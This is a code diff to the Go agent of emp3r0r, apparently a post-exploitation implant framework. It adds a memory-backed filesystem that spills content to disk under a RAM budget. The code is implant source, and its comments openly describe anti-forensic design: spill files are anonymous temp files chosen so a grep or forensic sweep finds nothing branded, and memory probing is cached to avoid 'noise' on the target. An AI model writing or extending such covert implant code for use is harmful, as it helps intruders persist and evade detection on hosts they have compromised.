@@ -8,13 +8,16 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	// Added sync import
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 )
 
 // Dentry Directory entry
@@ -106,7 +109,7 @@ func lsMemDir(targetPath string) []Dentry {
 	MemFileLock.RLock()
 	defer MemFileLock.RUnlock()
 
-	for memPath, data := range MemFileMap {
+	for memPath := range MemFileMap {
 		if !strings.HasPrefix(memPath, "mem:") {
 			continue
 		}
@@ -118,7 +121,7 @@ func lsMemDir(targetPath string) []Dentry {
 		dents = append(dents, Dentry{
 			Name:       memPath, // show full mem:/// path so users know exactly where it lives
 			Ftype:      "file (mem)",
-			Size:       fmt.Sprintf("%d bytes", len(data)),
+			Size:       fmt.Sprintf("%d bytes", memBytesFor(memPath)),
 			Date:       "N/A",
 			Permission: "-rw-------",
 		})
@@ -422,12 +425,16 @@ func FileSize(path string) (size int64) {
 	if strings.HasPrefix(path, "mem:") {
 		norm := NormalizeMemPath(path)
 		MemFileLock.RLock()
-		data, ok := MemFileMap[norm]
-		MemFileLock.RUnlock()
-		if ok {
-			return int64(len(data))
+		_, ok := MemFileMap[norm]
+		if !ok {
+			MemFileLock.RUnlock()
+			return 0
 		}
-		return 0
+		// memBytesFor reads the map and spill metadata; caller holds the lock
+		// so recursion is safe.
+		size = memBytesFor(norm)
+		MemFileLock.RUnlock()
+		return size
 	}
 
 	fi, err := os.Stat(path)
@@ -563,7 +570,19 @@ func RemoveFileAgent(path string) error {
 	if strings.HasPrefix(path, "mem:") {
 		path = NormalizeMemPath(path)
 		MemFileLock.Lock()
+		if old := MemFileMap[path]; old != nil {
+			memTotalBytes -= int64(len(old))
+		}
 		delete(MemFileMap, path)
+		if p := memSpillPaths[path]; p != "" {
+			delete(memSpilled, path)
+			delete(memSpillPaths, path)
+			MemFileLock.Unlock()
+			_ = os.Remove(p)
+			NotifyMemFSChanged()
+			logging.Debugf("Agent: Removed memory file %s", path)
+			return nil
+		}
 		MemFileLock.Unlock()
 		NotifyMemFSChanged()
 		logging.Debugf("Agent: Removed memory file %s", path)
@@ -639,13 +658,253 @@ func copyDirAgent(src, dst string) error {
 // SetFileCryptoKey sets the key for file encryption
 var fileCryptoKey []byte
 
-// MemFileMap stores file content in memory
+// MemFileMap is the flat memfs namespace. For entries that live in RAM the
+// value holds the (possibly encrypted) bytes; for entries that have spilled to
+// the on-disk backing store the value is nil and the bytes live in an unmarked
+// temp file (see memSpillPaths). Keep it exported for legacy callers/tests.
+//
+// MemFileMap doubles as the namespace index: keys are never deleted on spill,
+// only on RemoveFileAgent, so listing/existence queries stay simple.
 var (
 	MemFileMap       = make(map[string][]byte)
 	MemFileLock      sync.RWMutex
-	MemFileSizeLimit = 10 * 1024 * 1024 // 10MB
+	MemFileSizeLimit = 10 * 1024 * 1024          // 10MB (legacy constant; see memfsBudgetBytes)
+	memSpilled       = make(map[string]struct{}) // keys whose content is on the spill disk
+	memSpillPaths    = make(map[string]string)   // spilled key -> unmarked temp backing file
+	memTotalBytes    int64                       // current in-RAM memfs bytes (encrypted)
 	OnMemFSChanged   func()
+
+	// memfsBudgetCache caches the most recently computed RAM budget so a
+	// write burst does not re-probe /proc/meminfo (or equivalent) on every
+	// call. The budget is deliberately computed lazily on the first write and
+	// refreshed at most every memfsBudgetCacheInterval — never at process
+	// init, which would add startup noise and pin a stale snapshot. The
+	// value is derived from currently AVAILABLE memory at write time, so a
+	// busy target spills earlier and an idle one can keep more in RAM.
+	memfsBudgetCache     int64
+	memfsBudgetCachedAt  time.Time
+	memfsBudgetCacheMu   sync.Mutex
+	memfsBudgetCacheIntv = 5 * time.Second
+
+	// memfsLowMemWarned gates the (rate-limited) operator warning printed
+	// when free memory is so small that large memfs writes would thrash.
+	memfsLowMemWarnedMu sync.Mutex
+	memfsLowMemWarnedAt time.Time
 )
+
+// memSpillNewFile creates a fresh unmarked backing file for spilled memfs
+// content. os.CreateTemp with an empty pattern yields a name like
+// "1234567890" in the system temp dir — no product branding, nothing for a
+// quick grep/forensic sweep to key on. The file is created 0600 and the path
+// is tracked in-process (memSpillPaths) so a crash leaves at most one
+// anonymous temp file behind, exactly like any other process's temp litter.
+func memSpillNewFile() (string, error) {
+	d := os.TempDir()
+	if d == "" {
+		d = "."
+	}
+	f, err := os.CreateTemp(d, "")
+	if err != nil {
+		return "", err
+	}
+	name := f.Name()
+	if err := f.Close(); err != nil {
+		_ = os.Remove(name)
+		return "", err
+	}
+	return name, nil
+}
+
+// memSpillPathLocked returns the backing file path for a spilled memfs key, or
+// "" if the key is not spilled. Callers must hold MemFileLock (read is fine).
+func memSpillPathLocked(key string) string {
+	if _, ok := memSpilled[key]; !ok {
+		return ""
+	}
+	return memSpillPaths[key]
+}
+
+// memSpillPath is the externally visible variant for callers that do not hold
+// the lock (tests, diagnostics). It takes the lock itself.
+func memSpillPath(key string) string {
+	MemFileLock.RLock()
+	defer MemFileLock.RUnlock()
+	return memSpillPathLocked(key)
+}
+
+// memfsBudgetBytes returns the maximum bytes memfs may keep in RAM at the time
+// of a write.
+//
+// It is intentionally NOT computed at process init: that would add startup
+// noise and pin a stale snapshot for the whole agent lifetime. Instead the
+// budget is derived lazily on the first write (and refreshed every few
+// seconds) from the amount of memory currently AVAILABLE, so a busy target
+// with shrinking free RAM naturally spills earlier, while an idle one can use
+// more. An explicit EMP3R0R_MEMFS_LIMIT (bytes) overrides the heuristic
+// entirely.
+//
+// A hard absolute ceiling is still enforced so even a host with huge free RAM
+// can never let a single write balloon the process past memfsBudgetHardMax —
+// that bound is what keeps us confident the agent cannot overflow memory by
+// accident.
+func memfsBudgetBytes() int64 {
+	if v := os.Getenv("EMP3R0R_MEMFS_LIMIT"); v != "" {
+		if n, err := strconv.ParseInt(v, 10, 64); err == nil && n > 0 {
+			return n
+		}
+	}
+
+	// Serve from cache when fresh: probing available memory on every write
+	// would add syscall noise to a hot path (module caching etc.).
+	memfsBudgetCacheMu.Lock()
+	now := time.Now()
+	if memfsBudgetCachedAt.IsZero() || now.Sub(memfsBudgetCachedAt) > memfsBudgetCacheIntv {
+		memfsBudgetCache = computeMemfsBudget(now)
+		memfsBudgetCachedAt = now
+	}
+	budget := memfsBudgetCache
+	memfsBudgetCacheMu.Unlock()
+	return budget
+}
+
+// memfsBudgetHardMax is the absolute ceiling for in-RAM memfs bytes. It is the
+// "sane upper limit" that guarantees a single write (or a rapid burst) can
+// never exhaust the process even when free RAM is plentiful.
+const memfsBudgetHardMax = 512 * 1024 * 1024 // 512 MiB
+
+// memfsBudgetMin is the floor: even a nearly-OOM target keeps enough headroom
+// for small module payloads to stay in RAM instead of churning the disk.
+const memfsBudgetMin = 16 * 1024 * 1024 // 16 MiB
+
+func computeMemfsBudget(now time.Time) int64 {
+	const (
+		memFraction = 4 // keep at most 1/4 of AVAILABLE memory for memfs
+		minAvailMB  = 128
+	)
+	avail := GetMemAvailable() // bytes; -1 when the platform cannot report it
+
+	if avail < 0 {
+		// Platform gives no availability data: fall back to a conservative
+		// fraction of total RAM, never exceeding the hard ceiling.
+		memMB := int64(sysinfo.GetMemSize()) // MB; -1 when unavailable
+		if memMB <= 0 {
+			return memfsBudgetMin
+		}
+		budget := (memMB * 1024 * 1024) / 64 // ~1.5% of physical RAM
+		if budget < memfsBudgetMin {
+			budget = memfsBudgetMin
+		}
+		if budget > memfsBudgetHardMax {
+			budget = memfsBudgetHardMax
+		}
+		return budget
+	}
+
+	// Warn (rate-limited, once per minute) when free memory is so small that
+	// large in-RAM memfs writes would push the target into swap/OOM. The user
+	// can then avoid uploading big files to memory or raise the explicit limit.
+	availMB := avail / (1024 * 1024)
+	if availMB < minAvailMB {
+		memfsLowMemWarnedMu.Lock()
+		shouldWarn := memfsLowMemWarnedAt.IsZero() || now.Sub(memfsLowMemWarnedAt) > time.Minute
+		if shouldWarn {
+			memfsLowMemWarnedAt = now
+		}
+		memfsLowMemWarnedMu.Unlock()
+		if shouldWarn {
+			logging.Warningf("memfs: only ~%d MB of memory is free; in-RAM memfs budget is limited to %d MiB. Large memory writes will spill to disk (encrypted) — avoid uploading very large files to memory on this target.", availMB, memfsBudgetMin/1024/1024)
+		}
+	}
+
+	budget := avail / memFraction
+	// Under memory pressure shrink the floor too: reserving the full 16 MiB
+	// floor on a host with only a few dozen MB free would itself be a large
+	// fraction of available RAM. Small payloads still stay in RAM; anything
+	// bigger spills.
+	var floor int64 = memfsBudgetMin
+	if availMB < minAvailMB {
+		floor = avail / 8
+		if floor < 4*1024*1024 {
+			floor = 4 * 1024 * 1024
+		}
+	}
+	if budget > memfsBudgetHardMax {
+		budget = memfsBudgetHardMax
+	}
+	if budget < floor {
+		budget = floor
+	}
+	return budget
+}
+
+// memBytesFor returns the raw stored length of key (encrypted when a crypto key
+// is set): RAM bytes from the map, or on-disk file size when spilled.
+// Callers must hold MemFileLock (read is fine).
+func memBytesFor(key string) int64 {
+	if p := memSpillPathLocked(key); p != "" {
+		if fi, err := os.Stat(p); err == nil {
+			return fi.Size()
+		}
+	}
+	if d := MemFileMap[key]; d != nil {
+		return int64(len(d))
+	}
+	return 0
+}
+
+// spillMemfsFile moves the in-RAM content of key to an unmarked temp backing
+// file so the RAM budget is respected. Callers must hold MemFileLock.
+func spillMemfsFile(key string) {
+	data := MemFileMap[key]
+	if data == nil {
+		return
+	}
+	path, err := memSpillNewFile()
+	if err != nil {
+		logging.Warningf("memfs: cannot create spill file for %s (%v); keeping in RAM", key, err)
+		return
+	}
+	if err := os.WriteFile(path, data, 0o600); err != nil {
+		logging.Warningf("memfs: spill of %s failed (%v); keeping in RAM", key, err)
+		_ = os.Remove(path)
+		return
+	}
+	// Keep the namespace entry (nil marker) so existence/listing queries still
+	// see the file; its bytes now live on the unmarked backing file.
+	MemFileMap[key] = nil
+	memSpilled[key] = struct{}{}
+	memSpillPaths[key] = path
+	memTotalBytes -= int64(len(data))
+	logging.Debugf("memfs: spilled %s to %s", key, path)
+}
+
+// memfsEnforceBudget evicts the least-recently-written in-RAM entries until the
+// budget is satisfied. Callers must hold MemFileLock.
+func memfsEnforceBudget() {
+	budget := memfsBudgetBytes()
+	if memTotalBytes <= budget {
+		return
+	}
+	// Iterate in insertion order (Go maps do not preserve order; repeat until
+	// under budget or nothing left to spill). LRU precision is not required,
+	// only termination.
+	for memTotalBytes > budget {
+		spilled := false
+		for key, data := range MemFileMap {
+			if data == nil {
+				continue
+			}
+			spillMemfsFile(key)
+			spilled = true
+			if memTotalBytes <= budget {
+				break
+			}
+		}
+		if !spilled {
+			break
+		}
+	}
+}
 
 // NotifyMemFSChanged triggers the OnMemFSChanged callback if registered
 func NotifyMemFSChanged() {
@@ -654,7 +913,7 @@ func NotifyMemFSChanged() {
 	}
 }
 
-// ListMemFiles returns all keys in MemFileMap
+// ListMemFiles returns all keys in MemFileMap (both RAM and spilled tiers).
 func ListMemFiles() []string {
 	MemFileLock.RLock()
 	defer MemFileLock.RUnlock()
@@ -706,11 +965,36 @@ func SaveFileAgent(filename string, data []byte, perm os.FileMode, strategy Stor
 			}
 		}
 
+		var staleSpillPath string
 		MemFileLock.Lock()
+		// Remove any previous spill marker/path for this key first: the new
+		// content is authoritative. Maps are only touched under the lock; the
+		// backing file itself is removed after unlock (no disk I/O under the
+		// lock).
+		staleSpillPath = memSpillPaths[filename]
+		delete(memSpilled, filename)
+		delete(memSpillPaths, filename)
+		// Account for the previous in-RAM footprint of this key before
+		// replacing it. A nil entry means it was spilled; the RAM cost was
+		// already released.
+		if old := MemFileMap[filename]; old != nil {
+			memTotalBytes -= int64(len(old))
+		}
 		dataCopy := make([]byte, len(data))
 		copy(dataCopy, data)
 		MemFileMap[filename] = dataCopy
+		memTotalBytes += int64(len(data))
+		// Never reject oversized content: spill older entries (and, if needed,
+		// this very entry) to the backing disk until the RAM budget holds.
+		// The budget probe (/proc/meminfo) happened in memfsBudgetBytes via the
+		// 5s cache; enforcement itself only walks entries while under the
+		// write lock, which is correct (no reader can see a half-spilled key)
+		// and rare (only when the budget is exceeded).
+		memfsEnforceBudget()
 		MemFileLock.Unlock()
+		if staleSpillPath != "" {
+			_ = os.Remove(staleSpillPath)
+		}
 
 		NotifyMemFSChanged()
 		logging.Debugf("Agent: Wrote %d bytes (encrypted) to memfs memory: %s", len(data), filename)
@@ -751,15 +1035,25 @@ func ReadFileAgent(filename string) ([]byte, error) {
 	if strings.HasPrefix(filename, "mem:") {
 		filename = NormalizeMemPath(filename)
 		MemFileLock.RLock()
-		memData, ok := MemFileMap[filename]
-		if ok {
-			data = make([]byte, len(memData))
-			copy(data, memData)
-		}
+		_, isSpilled := memSpilled[filename]
+		memData, inRAM := MemFileMap[filename]
+		// Resolve the backing path while still holding the lock so a
+		// concurrent Remove/Save cannot swap it out from under us.
+		spillPath := memSpillPathLocked(filename)
 		MemFileLock.RUnlock()
 
-		if !ok {
+		if !inRAM && !isSpilled {
 			return nil, fmt.Errorf("memfs: %s: file not found", filename)
+		}
+
+		if isSpilled {
+			data, err = os.ReadFile(spillPath)
+			if err != nil {
+				return nil, fmt.Errorf("memfs: read spill for %s: %v", filename, err)
+			}
+		} else {
+			data = make([]byte, len(memData))
+			copy(data, memData)
 		}
 
 		if len(fileCryptoKey) > 0 {
@@ -843,7 +1137,13 @@ func AppendToFileAgent(filename string, data []byte) error {
 		// Read, decrypt, append, encrypt, write
 		existing, err := ReadFileAgent(filename)
 		if err != nil && !os.IsNotExist(err) {
-			return fmt.Errorf("AppendToFileAgent read: %v", err)
+			// A fresh memfs:// file reports a plain not-found error rather than
+			// os.ErrNotExist; treat it as empty so the first encrypted append
+			// works there too.
+			if !strings.HasPrefix(filename, "mem:") || !strings.Contains(err.Error(), "not found") {
+				return fmt.Errorf("AppendToFileAgent read: %v", err)
+			}
+			existing = nil
 		}
 		// if os.IsNotExist, existing is nil/empty
 
